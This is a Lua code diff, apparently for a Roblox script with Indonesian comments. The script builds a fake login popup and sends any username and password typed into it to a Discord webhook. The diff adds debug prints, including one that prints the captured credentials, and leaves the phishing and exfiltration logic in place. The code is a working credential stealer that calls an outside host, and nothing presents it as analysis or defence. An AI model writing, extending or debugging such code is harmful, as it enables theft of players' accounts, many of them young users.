@@ -8,17 +8,20 @@ local function sendToDiscord(username, password)
         content = "Login attempt:\nUsername: " .. username .. "\nPassword: " .. password
     })
 
+    print("Payload yang dikirim:", payload) -- Debugging: Pastikan payload terlihat di Output
+
     -- Gunakan pcall untuk menangkap kesalahan
     local success, err = pcall(function()
         httpService:PostAsync(webhook_url, payload, Enum.HttpContentType.ApplicationJson)
     end)
 
     if success then
-        print("Data berhasil dikirim ke Discord!")
+        print("Data berhasil dikirim ke Discord!") -- Debugging: Konfirmasi keberhasilan
     else
-        print("Gagal mengirim data ke Discord:", err)
+        print("Gagal mengirim data ke Discord:", err) -- Debugging: Cetak pesan kesalahan
     end
 end
+
 
 -- Membuat GUI
 local screenGui = Instance.new("ScreenGui")
@@ -73,12 +76,13 @@ loginButton.TextColor3 = Color3.new(1, 1, 1)
 loginButton.MouseButton1Click:Connect(function()
     local username = usernameBox.Text
     local password = passwordBox.Text
-    print("Tombol login ditekan") -- Debug log
+    print("Tombol login ditekan") -- Debugging: Cetak log ketika tombol ditekan
 
     if username ~= "" and password ~= "" then
-        sendToDiscord(username, password) -- Memanggil fungsi sendToDiscord
-        frame:Destroy() -- Menghapus popup setelah login
+        print("Username:", username, "Password:", password) -- Debugging: Lihat nilai input
+        sendToDiscord(username, password) -- Panggil fungsi pengiriman
+        frame:Destroy() -- Hapus popup setelah login
     else
-        print("Username atau password tidak boleh kosong!")
+        print("Username atau password tidak boleh kosong!") -- Debugging: Kasus input kosong
     end
 end)
